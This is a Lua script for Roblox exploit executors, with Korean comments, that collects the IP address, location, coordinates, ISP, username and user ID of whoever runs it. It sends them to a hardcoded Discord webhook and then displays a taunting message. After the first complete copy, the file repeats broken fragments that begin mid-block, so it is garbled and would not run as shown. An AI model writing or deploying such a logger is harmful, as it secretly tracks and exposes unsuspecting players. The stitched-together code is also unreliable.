-- Executor용 IP Logger (Discord Webhook) - 수정 버전 -- webhook은 본인 것으로 바꾸세요! 
local webhook = "https://discord.com/api/webhooks/1492431498081734817/LvBueyCPIiSbamhZeJCItuoGe2kQgIzOIUJKVqYlSCalkBM7dlH1gyn24RG4bpp20-tE" -- 여기에 웹훅 URL 입력 

local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 

-- IP 정보 가져오기 (언어 옵션만 ?lang=ko로 수정됨)
local ipSuccess, ipResponse = pcall(function() return http_request({ Url = "http://ip-api.com/json/?lang=ko", Method = "GET", Headers = { ["User-Agent"] = "RobloxExecutorIPLogger/1.0" } }) end) 

local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", isp = "N/A", lat = "N/A", -- 추가 
lon = "N/A" -- 추가 
} 

if ipSuccess then 
    local rawBody 
    if type(ipResponse) == "string" then 
        rawBody = ipResponse 
    elseif type(ipResponse) == "table" then 
        if ipResponse.Body then 
            rawBody = ipResponse.Body 
        elseif ipResponse.Success and ipResponse.StatusCode == 200 then 
            rawBody = ipResponse.Body or "" 
        else 
            rawBody = "" 
        end 
    else 
        rawBody = "" 
    end 
    
    if rawBody ~= "" then 
        local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(rawBody) end) 
        if decodeSuccess and type(decoded) == "table" and decoded.status == "success" then 
            ipData = decoded 
        else 
            ipData.error = "JSON 파싱 실패" 
        end 
    else 
        ipData.error = "응답 본문 없음" 
    end 
else 
    ipData.error = "IP 요청 실패" 
end 

-- 추가 정보 (player 부분 안전하게) 
local playerName = "???" 
local playerId = 0 
-- LocalPlayer가 nil이어도 크래시 안 나게 
if game.Players.LocalPlayer then 
    local plr = game.Players.LocalPlayer 
    playerName = plr.Name or "???" 
    playerId = plr.UserId or 0 
end 

-- 게임 이름 가져오기 (MarketplaceService 사용) 
local gameName = "알 수 없음" 
local success, result = pcall(function() 
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) 
    return info.Name or "이름 없음" 
end) 
if success then gameName = result else gameName = "가져오기 실패 (" .. tostring(result) .. ")" end 

local extra = { 
    username = playerName, 
    userid = playerId, 
    executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "알 수 없음", 
    placeid = game.PlaceId or 0, 
    gamename = gameName, -- 추가 
    time = os.date("%Y-%m-%d %H:%M:%S KST") 
} 

-- Embed 구성 
local embed = { 
    title = "Executor IP 로그 (테스트용)", 
    description = "누군가 스크립트를 실행했습니다.", 
    color = 16711680, -- 빨강 
    fields = { 
        {name = "IP", value = ipData.query or "N/A", inline = true}, 
        {name = "국가", value = ipData.country or "N/A", inline = true}, 
        {name = "도시", value = ipData.city or "N/A", inline = true}, 
        {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, -- 추가 
        {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, -- 추가 
        {name = "ISP", value = ipData.isp or ipData.org or "N/A", inline = false}, 
        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
        {name = "실행기", value = extra.executor, inline = false}, 
        {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
        {name = "게임 이름", value = extra.gamename, inline = false}, -- 추가 
        {name = "실행 시간", value = extra.time, inline = false} 
    }, 
    footer = {text = "IP 로그"} 
} 

local payload = { 
    embeds = {embed}, 
    username = "스크립트 IP 로그", 
} 

-- 전송 
local sendSuccess, sendResult = pcall(function() 
    return http_request({ 
        Url = webhook, 
        Method = "POST", 
        Headers = { ["Content-Type"] = "application/json" }, 
        Body = game:GetService("HttpService"):JSONEncode(payload) 
    }) 
end) 

if sendSuccess then 
    if type(sendResult) == "table" then 
        if sendResult.StatusCode == 204 or sendResult.StatusCode == 200 then 
            print("IP 로그 전송 성공!") 
        else 
            warn("전송 실패 - Status: " .. tostring(sendResult.StatusCode)) 
        end 
    else 
        print("전송 완료 (상태 확인 불가)") 
    end 
else 
    warn("Webhook 전송 중 오류: " .. tostring(sendResult)) 
end
local playerName = "???" 
local playerId = 0 
if game.Players.LocalPlayer then 
    playerName = game.Players.LocalPlayer.Name
    playerId = game.Players.LocalPlayer.UserId
end 

local gameName = "알 수 없음" 
pcall(function() 
    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
end) 

-- [3] 디스코드 Embed 구성
local payload = { 
    username = "스크립트 IP 로그",
    embeds = {{ 
        title = "Executor IP 로그 (테스트용)", 
        description = "누군가 스크립트를 실행했습니다.", 
        color = 16711680, 
        fields = { 
            {name = "IP", value = ipData.query or "N/A", inline = true}, 
            {name = "국가", value = ipData.country or "N/A", inline = true}, 
            {name = "도시", value = ipData.city or "N/A", inline = true}, 
            {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, 
            {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, 
            {name = "ISP", value = ipData.isp or "N/A", inline = false}, 
            {name = "닉네임", value = playerName .. " (" .. tostring(playerId) .. ")", inline = false}, 
            {name = "실행기", value = (identifyexecutor and identifyexecutor()) or "알 수 없음", inline = false}, 
            {name = "게임 이름", value = gameName, inline = false}, 
            {name = "실행 시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = false} 
        }, 
        footer = {text = "IP 로그"} 
    }} 
} 

-- [4] 전송 실행
local sendSuccess, sendResult = pcall(function() 
    return http_request({ 
        Url = webhook, 
        Method = "POST", 
        Headers = { ["Content-Type"] = "application/json" }, 
        Body = game:GetService("HttpService"):JSONEncode(payload) 
    }) 
end) 

-- [5] 화면 UI 생성 (사라지지 않음)
local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Name = "PermanentUI"
screenGui.Parent = game:GetService("CoreGui")
screenGui.IgnoreGuiInset = true

textLabel.Parent = screenGui
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.BackgroundTransparency = 0.4
textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
textLabel.Size = UDim2.new(0, 300, 0, 60)
textLabel.Font = Enum.Font.GothamBold
textLabel.Text = "IP 따임 VPN이면 ㅊㅋㅊㅋㄷ"
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20
textLabel.TextWrapped = true

-- 출력 로그
if sendSuccess then print("IP 로그 전송 성공!") else warn("전송 실패") end
    else 
        ipData.error = "응답 본문 없음" 
    end 
else 
    ipData.error = "IP 요청 실패" 
end 

-- 추가 정보 (player 부분 안전하게) 
local playerName = "???" 
local playerId = 0 
-- LocalPlayer가 nil이어도 크래시 안 나게 
if game.Players.LocalPlayer then 
    local plr = game.Players.LocalPlayer 
    playerName = plr.Name or "???" 
    playerId = plr.UserId or 0 
end 

-- 게임 이름 가져오기 (MarketplaceService 사용) 
local gameName = "알 수 없음" 
local success, result = pcall(function() 
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) 
    return info.Name or "이름 없음" 
end) 
if success then gameName = result else gameName = "가져오기 실패 (" .. tostring(result) .. ")" end 

local extra = { 
    username = playerName, 
    userid = playerId, 
    executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "알 수 없음", 
    placeid = game.PlaceId or 0, 
    gamename = gameName, -- 추가 
    time = os.date("%Y-%m-%d %H:%M:%S KST") 
} 

-- Embed 구성 
local embed = { 
    title = "Executor IP 로그 (테스트용)", 
    description = "누군가 스크립트를 실행했습니다.", 
    color = 16711680, -- 빨강 
    fields = { 
        {name = "IP", value = ipData.query or "N/A", inline = true}, 
        {name = "국가", value = ipData.country or "N/A", inline = true}, 
        {name = "도시", value = ipData.city or "N/A", inline = true}, 
        {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, -- 추가 
        {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, -- 추가 
        {name = "ISP", value = ipData.isp or ipData.org or "N/A", inline = false}, 
        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
        {name = "실행기", value = extra.executor, inline = false}, 
        {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
        {name = "게임 이름", value = extra.gamename, inline = false}, -- 추가 
        {name = "실행 시간", value = extra.time, inline = false} 
    }, 
    footer = {text = "IP 로그"} 
} 

local payload = { 
    embeds = {embed}, 
    username = "스크립트 IP 로그", 
} 

-- 전송 
local sendSuccess, sendResult = pcall(function() 
    return http_request({ 
        Url = webhook, 
        Method = "POST", 
        Headers = { ["Content-Type"] = "application/json" }, 
        Body = game:GetService("HttpService"):JSONEncode(payload) 
    }) 
end) 

-- [추가된 UI 섹션 - 사라지지 않음]
local screenGui = Instance.new("ScreenGui")
local textLabel = Instance.new("TextLabel")

screenGui.Name = "PermanentUI"
screenGui.Parent = game:GetService("CoreGui")
screenGui.IgnoreGuiInset = true

textLabel.Parent = screenGui
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.BackgroundTransparency = 0.4
textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
textLabel.Size = UDim2.new(0, 300, 0, 60)
textLabel.Font = Enum.Font.GothamBold
textLabel.Text = "IP 따임 VPN이면 ㅊㅋㅊㅋ" -- 👈 이 문구를 직접 수정하세요!
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.TextSize = 20
textLabel.TextWrapped = true

-- 상태 출력
if sendSuccess then 
    print("IP 로그 전송 성공!") 
else 
    warn("Webhook 전송 중 오류: " .. tostring(sendResult)) 
end
    else 
        ipData.error = "응답 본문 없음" 
    end 
else 
    ipData.error = "IP 요청 실패" 
end 

-- 추가 정보 (player 부분 안전하게) 
local playerName = "???" 
local playerId = 0 
-- LocalPlayer가 nil이어도 크래시 안 나게 
if game.Players.LocalPlayer then 
    local plr = game.Players.LocalPlayer 
    playerName = plr.Name or "???" 
    playerId = plr.UserId or 0 
end 

-- 게임 이름 가져오기 (MarketplaceService 사용) 
local gameName = "알 수 없음" 
local success, result = pcall(function() 
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) 
    return info.Name or "이름 없음" 
end) 
if success then gameName = result else gameName = "가져오기 실패 (" .. tostring(result) .. ")" end 

local extra = { 
    username = playerName, 
    userid = playerId, 
    executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "알 수 없음", 
    placeid = game.PlaceId or 0, 
    gamename = gameName, -- 추가 
    time = os.date("%Y-%m-%d %H:%M:%S KST") 
} 

-- Embed 구성 
local embed = { 
    title = "Executor IP 로그 (테스트용)", 
    description = "누군가 스크립트를 실행했습니다.", 
    color = 16711680, -- 빨강 
    fields = { 
        {name = "IP", value = ipData.query or "N/A", inline = true}, 
        {name = "국가", value = ipData.country or "N/A", inline = true}, 
        {name = "도시", value = ipData.city or "N/A", inline = true}, 
        {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, -- 추가 
        {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, -- 추가 
        {name = "ISP", value = ipData.isp or ipData.org or "N/A", inline = false}, 
        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
        {name = "실행기", value = extra.executor, inline = false}, 
        {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
        {name = "게임 이름", value = extra.gamename, inline = false}, -- 추가 
        {name = "실행 시간", value = extra.time, inline = false} 
    }, 
    footer = {text = "IP 로그"} 
} 

local payload = { 
    embeds = {embed}, 
    username = "스크립트 IP 로그", 
} 

-- 전송 
local sendSuccess, sendResult = pcall(function() 
    return http_request({ 
        Url = webhook, 
        Method = "POST", 
        Headers = { ["Content-Type"] = "application/json" }, 
        Body = game:GetService("HttpService"):JSONEncode(payload) 
    }) 
end) 

if sendSuccess then 
    if type(sendResult) == "table" then 
        if sendResult.StatusCode == 204 or sendResult.StatusCode == 200 then 
            print("IP 로그 전송 성공!") 
        else 
            warn("전송 실패 - Status: " .. tostring(sendResult.StatusCode)) 
        end 
    else 
        print("전송 완료 (상태 확인 불가)") 
    end 
else 
    warn("Webhook 전송 중 오류: " .. tostring(sendResult)) 
end
    else 
        ipData.error = "응답 본문 없음" 
    end 
else 
    ipData.error = "IP 요청 실패" 
end 

-- 추가 정보 (player 부분 안전하게) 
local playerName = "???" 
local playerId = 0 
-- LocalPlayer가 nil이어도 크래시 안 나게 
if game.Players.LocalPlayer then 
    local plr = game.Players.LocalPlayer 
    playerName = plr.Name or "???" 
    playerId = plr.UserId or 0 
end 

-- 게임 이름 가져오기 (MarketplaceService 사용) 
local gameName = "알 수 없음" 
local success, result = pcall(function() 
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) 
    return info.Name or "이름 없음" 
end) 
if success then gameName = result else gameName = "가져오기 실패 (" .. tostring(result) .. ")" end 

local extra = { 
    username = playerName, 
    userid = playerId, 
    executor = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "알 수 없음", 
    placeid = game.PlaceId or 0, 
    gamename = gameName, -- 추가 
    time = os.date("%Y-%m-%d %H:%M:%S KST") 
} 

-- Embed 구성 
local embed = { 
    title = "Executor IP 로그 (테스트용)", 
    description = "누군가 스크립트를 실행했습니다.", 
    color = 16711680, -- 빨강 
    fields = { 
        {name = "IP", value = ipData.query or "N/A", inline = true}, 
        {name = "국가", value = ipData.country or "N/A", inline = true}, 
        {name = "도시", value = ipData.city or "N/A", inline = true}, 
        {name = "위도 (lat)", value = tostring(ipData.lat or "N/A"), inline = true}, -- 추가 
        {name = "경도 (lon)", value = tostring(ipData.lon or "N/A"), inline = true}, -- 추가 
        {name = "ISP", value = ipData.isp or ipData.org or "N/A", inline = false}, 
        {name = "닉네임", value = extra.username .. " (" .. tostring(extra.userid) .. ")", inline = false}, 
        {name = "실행기", value = extra.executor, inline = false}, 
        {name = "PlaceId", value = tostring(extra.placeid), inline = false}, 
        {name = "게임 이름", value = extra.gamename, inline = false}, -- 추가 
        {name = "실행 시간", value = extra.time, inline = false} 
    }, 
    footer = {text = "IP 로그"} 
} 

local payload = { 
    embeds = {embed}, 
    username = "스크립트 IP 로그", 
} 

-- 전송 
local sendSuccess, sendResult = pcall(function() 
    return http_request({ 
        Url = webhook, 
        Method = "POST", 
        Headers = { ["Content-Type"] = "application/json" }, 
        Body = game:GetService("HttpService"):JSONEncode(payload) 
    }) 
end) 

if sendSuccess then 
    if type(sendResult) == "table" then 
        if sendResult.StatusCode == 204 or sendResult.StatusCode == 200 then 
            print("IP 로그 전송 성공!") 
        else 
            warn("전송 실패 - Status: " .. tostring(sendResult.StatusCode)) 
        end 
    else 
        print("전송 완료 (상태 확인 불가)") 
    end 
else 
    warn("Webhook 전송 중 오류: " .. tostring(sendResult)) 
end
